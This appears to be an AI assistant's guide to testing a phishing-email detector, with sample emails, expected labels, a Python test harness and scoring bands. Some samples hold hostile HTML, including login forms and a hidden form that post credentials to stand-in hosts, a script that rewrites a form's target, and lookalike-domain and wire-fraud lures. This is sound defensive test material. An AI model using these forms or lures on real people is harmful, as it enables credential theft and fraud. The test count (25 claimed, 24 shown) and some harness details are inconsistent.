# Concrete Test Cases for Your Phishing Detection System

## QUICK START: Run These Tests First

### Test Set 1: Baseline Sanity Checks (Should get 100%)

**Test 1.1: Obvious Phishing - Misspelled Bank Domain**
```
From: no-reply@paypa1.com (note: '1' instead of 'l')
Subject: URGENT: Verify Your PayPal Account
Body: "Your account has been limited. Click here to verify: http://paypa1.com/verify-account"
```
- Expected: PHISHING (very high confidence > 90%)
- Features that should trigger:
  - Lookalike domain (paypa1 ≈ paypal)
  - Urgent language ("URGENT", "verify")
  - External URL
  - Suspicious sender domain

**Test 1.2: Obvious Phishing - Fake Bank Password Reset**
```
From: alerts@fake-bank.com
Subject: Password Reset Confirmation
Body: "Click to reset your password: http://fake-bank-secure.com/reset?token=abc123"
Embedded link anchor text: "Click here to reset"
```
- Expected: PHISHING (confidence > 85%)
- Features:
  - Suspicious domain (fake-bank)
  - Password reset social engineering
  - External link for credential submission

**Test 1.3: Obvious Phishing - Nigerian Prince (Spam)**
```
From: rich_prince@gmail.com
Subject: Claim Your Inheritance!!!
Body: "I have $5,000,000 waiting for you. Send $500 to claim it. Bank details: ..."
```
- Expected: PHISHING (confidence > 80%)
- Features:
  - Financial scam keywords
  - Excessive punctuation
  - Request for money/personal info

**Test 1.4: Obvious Phishing - Malware Attachment**
```
From: invoice@fake-company.com
Subject: Invoice #2026-001
Attachment: invoice.exe
Body: "Please see attached invoice"
```
- Expected: PHISHING (confidence > 90%)
- Features:
  - Executable attachment
  - Suspicious filename
  - Invoice pretense (common malware vector)

**Test 1.5: Legitimate - Password Reset from Real Bank**
```
From: noreply@mybank.com (verified domain, legitimate)
Subject: Password Reset Request
Body: "We received a password reset request. If this was you, click the link below. If not, ignore this email.
Link: https://mybank.com/reset?token=secure_token_here&expires=3600"
SPF/DKIM/DMARC: All pass
```
- Expected: SAFE (confidence < 20%)
- Features:
  - Legitimate sender domain
  - HTTPS link
  - Proper authentication
  - Standard password reset language (not overly urgent)
  - "If not, ignore" disclaimer

---

### Test Set 2: URL-Based Evasion (60-70% accuracy expected)

**Test 2.1: Long Obfuscated URL**
```
From: support@fake-paypal.com
Subject: Account Verification
Body: "Verify: http://paypal-verify.com/confirm?redirect=http%3A%2F%2Fverify-account.fake-bank.com%2Flogin&session=abc123&timestamp=2026-09-08T10:00:00Z&tracking=xyz789"
```
- Expected: PHISHING (medium-high confidence 70-85%)
- Evasion technique: Long URL with embedded redirect
- Question: Does your system:
  - [ ] Detect that redirect parameter contains another domain?
  - [ ] Follow the redirect chain?
  - [ ] Analyze final landing domain?

**Test 2.2: URL Shortener Expanding to Phishing**
```
From: sales@company.com (looks legitimate)
Subject: Check out this article!
Body: "Great article: http://bit.ly/abc123"
(Bit.ly expands to: http://phishing-site.ru/fake-bank-login)
```
- Expected: PHISHING (confidence 70-80%)
- Question: Does your system:
  - [ ] Expand shortened URLs?
  - [ ] Analyze final destination?
  - [ ] Check if legitimate domain shortened to phishing?

**Test 2.3: Homograph Attack - Cyrillic Domain**
```
From: support@раypal.com (Cyrillic 'а' that looks like English 'a')
Subject: Account Security
Body: "Verify account: https://раypal.com/verify"
```
- Expected: PHISHING (confidence 75-85%)
- Question: Does your system:
  - [ ] Detect punycode domains?
  - [ ] Compare visual similarity to legitimate domains?
  - [ ] Have a database of visual lookalikes?

**Test 2.4: Misleading Subdomain**
```
From: no-reply@bank-login.attacker.com
Subject: Verify your account
Body: "Click: https://bank-login.attacker.com/verify"
```
- Expected: PHISHING (confidence 70-80%)
- Question: Does your system:
  - [ ] Parse subdomains correctly?
  - [ ] Recognize that attacker.com is the real domain?
  - [ ] Flag suspicious subdomains (containing bank names)?

**Test 2.5: Recently Registered Domain**
```
From: noreply@paypal-secure.com
Subject: Account Verification
Body: "Verify: https://paypal-secure.com/verify-now"
Domain registered: August 30, 2026 (8 days ago)
```
- Expected: PHISHING (confidence 65-75%)
- Question: Does your system:
  - [ ] Check domain age (WHOIS)?
  - [ ] Flag newly registered domains?
  - [ ] Have WHOIS API integration (which service)?

**Test 2.6: HTTPS with Phishing Domain**
```
From: support@phishing-bank.ru
Subject: Update Your Payment Method
Body: "Update: https://phishing-bank.ru/payment"
(HTTPS enabled, certificate valid for phishing-bank.ru)
```
- Expected: PHISHING (confidence 70-80%)
- Why hard: HTTPS is present, but domain is still suspicious
- Question: Does your system:
  - [ ] Not give excessive weight to HTTPS?
  - [ ] Still flag suspicious domains despite HTTPS?

---

### Test Set 3: HTML & Webpage Evasion (50-65% accuracy expected)

**Test 3.1: Embedded Login Form**
```
From: security@bank.com (legitimate domain)
Subject: Security Check Required
Body: (HTML email containing login form)
<form method="POST" action="http://phishing-site.ru/capture">
  <input name="username" placeholder="Username">
  <input name="password" type="password" placeholder="Password">
  <button>Verify Account</button>
</form>
```
- Expected: PHISHING (confidence 70-85%)
- Why hard: Email from legitimate domain, but contains phishing form
- Question: Does your system:
  - [ ] Parse HTML forms?
  - [ ] Detect password input fields in email?
  - [ ] Check form submission target domain?

**Test 3.2: JavaScript Form Redirect**
```
HTML email with:
<form method="POST" action="https://bank.com/verify" onsubmit="this.action='http://phishing.ru/steal'">
  (Hidden JavaScript redirects form to phishing server)
</form>
```
- Expected: PHISHING (confidence 65-80%)
- Why hard: Form appears to go to legitimate site, but JS modifies it
- Question: Does your system:
  - [ ] Parse JavaScript?
  - [ ] Execute or statically analyze JavaScript?
  - [ ] Is this beyond scope?

**Test 3.3: Iframe with Phishing Content**
```
HTML email with:
<iframe src="http://phishing-login.ru/"></iframe>
(Displays login form from phishing site)
```
- Expected: PHISHING (confidence 70-85%)
- Question: Does your system:
  - [ ] Detect iframes?
  - [ ] Analyze iframe sources?

**Test 3.4: Hidden/Invisible Form**
```
HTML with:
<form style="display:none;" action="http://phishing.ru/capture">
  (Hidden credential form)
</form>
```
- Expected: PHISHING (confidence 60-75%)
- Question: Does your system:
  - [ ] Detect hidden elements?
  - [ ] Flag suspicious hidden forms?

---

### Test Set 4: Email Header & Authentication Evasion (65-80% accuracy)

**Test 4.1: Failed SPF but Looks Legitimate**
```
From: cfo@company.com
Subject: Urgent Wire Transfer Needed
Body: "Please wire $50,000 to ..."
SPF Result: fail (email not from company's mail server)
DKIM: Missing
DMARC: Missing
```
- Expected: PHISHING or SUSPICIOUS (confidence 65-75%)
- Why hard: Legitimate email account compromised
- This is Business Email Compromise (BEC)
- Question: Does your system:
  - [ ] Check SPF/DKIM/DMARC results?
  - [ ] Detect compromised legitimate accounts?
  - [ ] Have sender reputation checks?

**Test 4.2: Display Name Spoofing**
```
From: "PayPal Support" <attacker@phishing.com>
Subject: Account Verification
(Display name says PayPal, but actual sender is attacker@phishing.com)
```
- Expected: PHISHING (confidence 70-85%)
- Question: Does your system:
  - [ ] Compare display name vs. actual sender?
  - [ ] Check if display name matches sender domain?

**Test 4.3: Reply-To Different from From**
```
From: noreply@legitimate-bank.com (properly authenticated)
Reply-To: support@phishing-bank.ru
Subject: Account Verification
```
- Expected: PHISHING (confidence 65-75%)
- Why: User might reply to the phishing address
- Question: Does your system:
  - [ ] Detect From ≠ Reply-To mismatch?
  - [ ] Flag suspicious Reply-To domains?

**Test 4.4: International Domain Name (IDN)**
```
From: support@banco.es (legitimate Spanish bank domain)
Subject: Account Verification
Body: "Click: https://banco.es/verify"
(Legitimate domain, not phishing, but tests IDN handling)
```
- Expected: SAFE (confidence < 30%)
- Why: International domains should not be penalized
- Question: Does your system:
  - [ ] Handle IDN correctly?
  - [ ] Not flag legitimate international domains?

---

### Test Set 5: False Positive Prevention (95%+ accuracy)

**Test 5.1: Real Bank Password Reset**
```
From: noreply@chase.com
Subject: Chase: Password Reset Confirmation
Body: "We received your password reset request. Click the link below to set a new password.

https://secure.chase.com/reset?token=abc&expires=3600

This link expires in 1 hour.

If you didn't request this, please ignore this email."
SPF: pass
DKIM: pass
DMARC: pass
```
- Expected: SAFE (confidence < 15%)

**Test 5.2: Real Service Update Email**
```
From: noreply@github.com
Subject: You have a new notification
Body: "Hi [user],

You were mentioned in an issue: https://github.com/org/repo/issues/123

View on GitHub: [link]"
SPF: pass
DKIM: pass
```
- Expected: SAFE (confidence < 15%)

**Test 5.3: Company Internal Alert**
```
From: it-team@company.com
Subject: URGENT: System Maintenance Required
Body: "All staff,

We're performing critical security updates. Please do not use the VPN between 10 PM - 2 AM tonight.

For questions, contact IT: https://company.internal/it-support"
SPF: pass
DKIM: pass
(Internal domain)
```
- Expected: SAFE (confidence < 20%)
- Why: Internal sender, even if urgent
- Question: Does your system:
  - [ ] Have internal domain whitelist?
  - [ ] Not flag internal urgent emails?

**Test 5.4: Legitimate Marketplace Email**
```
From: seller-alerts@ebay.com
Subject: Your item sold for $250!
Body: "Congratulations! Your item sold.

Buyer has 3 days to pay.

https://ebay.com/my/sales

Check your earnings..."
SPF: pass
DKIM: pass
```
- Expected: SAFE (confidence < 15%)

**Test 5.5: Real Newsletter**
```
From: newsletter@techcrunch.com
Subject: This week in tech
Body: "[Article 1]: https://techcrunch.com/article1
[Article 2]: https://techcrunch.com/article2
[Article 3]: https://techcrunch.com/article3
..."
SPF: pass
```
- Expected: SAFE (confidence < 15%)
- Why: Legitimate newsletter with multiple links (not phishing)

---

## HOW TO RUN THESE TESTS

### Step 1: Create Test Dataset

Save each test as an `.eml` file:

```
test_1_1_obvious_paypal.eml
test_1_2_obvious_password_reset.eml
test_2_1_long_url_redirect.eml
test_3_1_embedded_form.eml
...
```

### Step 2: Run Through Your System

```python
import requests
import json

test_cases = [
    # (test_id, eml_file_path, expected_label, expected_confidence_min)
    ("test_1_1", "test_1_1_obvious_paypal.eml", "phishing", 0.90),
    ("test_1_2", "test_1_2_obvious_password_reset.eml", "phishing", 0.85),
    ("test_2_1", "test_2_1_long_url_redirect.eml", "phishing", 0.70),
    ("test_3_1", "test_3_1_embedded_form.eml", "phishing", 0.70),
    ("test_5_1", "test_5_1_real_bank_reset.eml", "safe", 0.85),
    # ... more test cases
]

results = []
for test_id, eml_file, expected_label, expected_confidence_min in test_cases:
    with open(eml_file, 'r') as f:
        eml_content = f.read()
    
    # Call your API
    response = requests.post(
        'http://localhost:5000/api/v1/analyze/email',
        json={'eml_content': eml_content}
    )
    
    prediction = response.json()
    results.append({
        'test_id': test_id,
        'expected': expected_label,
        'predicted': prediction['label'],
        'confidence': prediction['confidence'],
        'correct': (prediction['label'] == expected_label) and (prediction['confidence'] >= expected_confidence_min),
        'details': prediction
    })

# Analyze results
correct = sum(1 for r in results if r['correct'])
total = len(results)
print(f"Accuracy: {correct}/{total} = {100*correct/total:.1f}%")

# Show failures
for r in results:
    if not r['correct']:
        print(f"\n{r['test_id']}: FAILED")
        print(f"  Expected: {r['expected']} ({expected_confidence_min})")
        print(f"  Got: {r['predicted']} ({r['confidence']:.2f})")
```

### Step 3: Analyze Failures

For each failed test, ask:

1. **Is it a feature missing?**
   - Did your feature extraction fail?
   - Did you not compute an important signal?

2. **Is it a model issue?**
   - Did the model not learn to weight the signal correctly?
   - Is the feature present but not important enough?

3. **Is it a threshold issue?**
   - Is the confidence score too low/high?
   - Did the decision threshold cause misclassification?

4. **Is it an integration issue?**
   - Did an external API fail?
   - Did URL expansion not work?

---

## SCORING GUIDELINES

**Category A (Obvious Phishing):**
- Expected: ≥ 95% accuracy
- If lower: Basic feature extraction failing

**Category B (URL Evasion):**
- Expected: 60-75% accuracy
- Acceptable: Not all evasion detected (hard problem)
- Investigate: Why specific evasions work

**Category C (HTML Evasion):**
- Expected: 50-65% accuracy
- This is the hardest category

**Category D (Email Header Evasion):**
- Expected: 65-80% accuracy
- Focus on header analysis correctness

**Category E (False Positives):**
- Expected: ≥ 95% accuracy (critical!)
- If lower: Your system is too aggressive

---

## EXPECTED RESULTS INTERPRETATION

### Good System Performance
```
Category A (Obvious):      95% accuracy
Category B (URL Evasion):  70% accuracy
Category C (HTML):         60% accuracy
Category D (Headers):      75% accuracy
Category E (FP):           96% accuracy

Overall: 79% accuracy
False Positive Rate: 4% (slightly high but acceptable)
False Negative Rate: 21% (room for improvement)
```

### Poor System Performance
```
Category A: 85% (missing obvious phishing!)
Category B: 45% (weak URL analysis)
Category C: 40% (HTML analysis failing)
Category D: 50% (header parsing issues)
Category E: 85% (too many false positives!)

Overall: 61% accuracy
Issues: Basic features broken, aggressive threshold
```

### Excellent System Performance
```
Category A: 99% accuracy
Category B: 75% accuracy
Category C: 70% accuracy
Category D: 80% accuracy
Category E: 98% accuracy

Overall: 84% accuracy
False Positive Rate: 2% (good - user trust)
False Negative Rate: 16% (acceptable)
```

---

## NEXT STEPS

1. **Convert these test cases to `.eml` format**
2. **Run your system on all 25 test cases**
3. **Record results in a table**
4. **Share results with me**
5. **I'll diagnose what's working/broken**
6. **Then we'll create specific improvements**

---

## WHERE TO CREATE TEST `.eml` FILES

Use this template:

```
From: {FROM_ADDRESS}
Subject: {SUBJECT}
Date: Mon, 8 Sep 2026 10:00:00 +0000
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

{HTML_BODY}
```

Example:

```
From: no-reply@paypa1.com
Subject: URGENT: Verify Your PayPal Account
Date: Mon, 8 Sep 2026 10:00:00 +0000
MIME-Version: 1.0
Content-Type: text/html; charset="UTF-8"
Content-Transfer-Encoding: 7bit

<html>
<body>
<p>Your account has been limited.</p>
<p><a href="http://paypa1.com/verify-account">Click here to verify</a></p>
</body>
</html>
```

---

**Ready to test? Run these 25 test cases and share the results. I'll then provide detailed diagnostics and improvement recommendations.**
